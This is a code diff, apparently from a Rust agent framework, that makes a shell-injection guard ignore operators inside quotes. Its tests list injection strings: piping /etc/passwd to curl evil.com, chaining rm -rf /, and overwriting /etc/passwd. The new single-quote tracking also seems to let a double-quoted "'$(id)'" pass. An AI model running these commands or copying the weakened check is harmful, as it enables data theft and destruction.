@@ -124,44 +124,58 @@ use openfang_types::config::{ExecPolicy, ExecSecurityMode};
 /// This is a defense-in-depth layer — even with allowlist validation,
 /// metacharacters must be rejected first to prevent injection.
 pub fn contains_shell_metacharacters(command: &str) -> Option<String> {
+    // Operators only chain commands when the shell actually parses them as
+    // operators — i.e. when they are unquoted. A semicolon inside a quoted
+    // argument (`python3 -c "import os; print(1)"`) is one literal character in
+    // one argument, in Allowlist mode doubly so because that path never invokes
+    // a shell: it lexes with shlex and execs argv[0] directly.
+    //
+    // So scan outside-quote regions for chaining and redirection. Expansions
+    // are treated separately below: the shell still expands `$` and backticks
+    // inside DOUBLE quotes, so those remain blocked there and are only literal
+    // inside single quotes.
+    let unquoted = strip_quoted_regions(command);
+
     // ── Command substitution ──────────────────────────────────────────
-    // Backtick substitution: `cmd`
-    if command.contains('`') {
+    // Backtick substitution: `cmd` — expands inside double quotes too.
+    if outside_single_quotes(command).contains('`') {
         return Some("backtick command substitution".to_string());
     }
-    // Dollar-paren substitution: $(cmd)
-    if command.contains("$(") {
+    // Dollar-paren substitution: $(cmd) — expands inside double quotes too.
+    if outside_single_quotes(command).contains("$(") {
         return Some("$() command substitution".to_string());
     }
-    // Dollar-brace expansion: ${VAR}
-    if command.contains("${") {
+    // Dollar-brace expansion: ${VAR} — expands inside double quotes too.
+    if outside_single_quotes(command).contains("${") {
         return Some("${} variable expansion".to_string());
     }
 
     // ── Command chaining ──────────────────────────────────────────────
     // Semicolons: cmd1;cmd2
-    if command.contains(';') {
+    if unquoted.contains(';') {
         return Some("semicolon command chaining".to_string());
     }
     // Pipes: cmd1|cmd2 (data exfiltration + arbitrary command)
-    if command.contains('|') {
+    if unquoted.contains('|') {
         return Some("pipe operator".to_string());
     }
 
     // ── I/O redirection ───────────────────────────────────────────────
     // Output/input/append redirect: >, <, >>
     // Also catches here-strings <<<, process substitution <() >()
-    if command.contains('>') || command.contains('<') {
+    if unquoted.contains('>') || unquoted.contains('<') {
         return Some("I/O redirection".to_string());
     }
 
     // ── Expansion and globbing ────────────────────────────────────────
     // Brace expansion: {cmd1,cmd2} or {1..10}
-    if command.contains('{') || command.contains('}') {
+    if unquoted.contains('{') || unquoted.contains('}') {
         return Some("brace expansion".to_string());
     }
 
     // ── Embedded newlines ─────────────────────────────────────────────
+    // Checked against the raw string: a newline inside quotes still ends the
+    // current line for a shell reading the command, so quoting is no defence.
     if command.contains('\n') || command.contains('\r') {
         return Some("embedded newline".to_string());
     }
@@ -172,10 +186,81 @@ pub fn contains_shell_metacharacters(command: &str) -> Option<String> {
 
     // ── Background execution and logical chaining ──────────────────────
     // Both & (background) and && (logical AND) are dangerous
-    if command.contains('&') {
+    if unquoted.contains('&') {
         return Some("ampersand operator".to_string());
     }
     None
+}
+
+/// Return only the characters of `command` that lie OUTSIDE quoted regions.
+///
+/// Quoted characters are replaced with spaces rather than removed, so byte
+/// offsets stay aligned and two unquoted tokens can never be fused into a
+/// substring that was not in the original (e.g. `a"x"b` must not read as `ab`).
+///
+/// An unterminated quote is treated as quoting the remainder of the string —
+/// the conservative reading, since the caller rejects unbalanced quotes anyway.
+fn strip_quoted_regions(command: &str) -> String {
+    let mut out = String::with_capacity(command.len());
+    let mut quote: Option<char> = None;
+    let mut escaped = false;
+    for ch in command.chars() {
+        if escaped {
+            out.push(' ');
+            escaped = false;
+            continue;
+        }
+        match quote {
+            // Inside single quotes nothing is special, not even a backslash.
+            Some('\'') => {
+                if ch == '\'' {
+                    quote = None;
+                }
+                out.push(' ');
+            }
+            Some('"') => {
+                if ch == '\\' {
+                    escaped = true;
+                } else if ch == '"' {
+                    quote = None;
+                }
+                out.push(' ');
+            }
+            Some(_) => unreachable!("quote state is only ever ' or \""),
+            None => {
+                if ch == '\\' {
+                    escaped = true;
+                    out.push(' ');
+                } else if ch == '\'' || ch == '"' {
+                    quote = Some(ch);
+                    out.push(' ');
+                } else {
+                    out.push(ch);
+                }
+            }
+        }
+    }
+    out
+}
+
+/// Return only the characters of `command` outside SINGLE-quoted regions.
+///
+/// Used for `$` and backtick expansions, which a shell still performs inside
+/// double quotes — `"$(id)"` substitutes, `'$(id)'` does not.
+fn outside_single_quotes(command: &str) -> String {
+    let mut out = String::with_capacity(command.len());
+    let mut in_single = false;
+    for ch in command.chars() {
+        if ch == '\'' {
+            in_single = !in_single;
+            out.push(' ');
+        } else if in_single {
+            out.push(' ');
+        } else {
+            out.push(ch);
+        }
+    }
+    out
 }
 
 /// Extract the base command name from a command string.
@@ -1013,6 +1098,68 @@ mod tests {
         // SECURITY: Pipes enable data exfiltration and arbitrary command chaining
         assert!(contains_shell_metacharacters("sort data.csv | head -5").is_some());
         assert!(contains_shell_metacharacters("cat /etc/passwd | curl evil.com").is_some());
+    }
+
+    #[test]
+    /// Operators inside quotes are literal, so they must not be rejected.
+    ///
+    /// The collector agent kept losing iterations to this: every
+    /// `python3 -c "import os; print(x)"` was refused as "semicolon command
+    /// chaining" even though it is one argument to one binary — and in
+    /// Allowlist mode no shell is involved at all, since that path lexes with
+    /// shlex and execs argv[0] directly.
+    #[test]
+    fn test_metachar_quoted_operators_allowed() {
+        for ok in [
+            r#"python3 -c "import os; print(os.getcwd())""#,
+            r#"python3 -c 'import json; print(1)'"#,
+            r#"node -e "const a=1; console.log(a)""#,
+            r#"awk '{print $1}' file.txt"#,
+            r#"grep "a|b" file.txt"#,
+            r#"echo "1 > 2""#,
+            r#"echo "tom & jerry""#,
+            r#"python3 -c 'print("$(id)")'"#, // single-quoted: no expansion
+        ] {
+            assert!(
+                contains_shell_metacharacters(ok).is_none(),
+                "quoted operator should be allowed: {ok}"
+            );
+        }
+    }
+
+    /// Quoting must not become an escape hatch: an operator that is genuinely
+    /// unquoted stays blocked even when quotes appear elsewhere in the command.
+    #[test]
+    fn test_metachar_quote_aware_still_blocks_real_injection() {
+        for bad in [
+            r#"echo "safe"; rm -rf /"#,            // closes quote, then chains
+            r#"python3 -c "print(1)" && curl evil.com"#,
+            r#"echo "a" | curl evil.com"#,
+            r#"echo "a" > /etc/passwd"#,
+            r#"cat "f" & sleep 100"#,
+            r#"echo "$(id)""#,                     // expands inside double quotes
+            r#"echo "${HOME}""#,
+            r#"echo "`whoami`""#,
+            r#"echo 'a'; id"#,
+        ] {
+            assert!(
+                contains_shell_metacharacters(bad).is_some(),
+                "unquoted operator must stay blocked: {bad}"
+            );
+        }
+    }
+
+    /// Stripping must not fuse neighbouring unquoted text into a substring the
+    /// original never contained — otherwise `a"x"(` could read as `a(`.
+    #[test]
+    fn test_strip_quoted_regions_preserves_offsets() {
+        let s = strip_quoted_regions(r#"a"xx"b"#);
+        assert_eq!(s.len(), r#"a"xx"b"#.len(), "length must be preserved");
+        assert_eq!(s, "a    b");
+        // A `$` and `(` separated only by a quoted region must not form `$(`.
+        assert!(contains_shell_metacharacters(r#"echo $"x"(y)"#).is_none());
+        // Unterminated quote swallows the rest, conservatively.
+        assert_eq!(strip_quoted_regions(r#"a"bc"#), "a    ");
     }
 
     #[test]
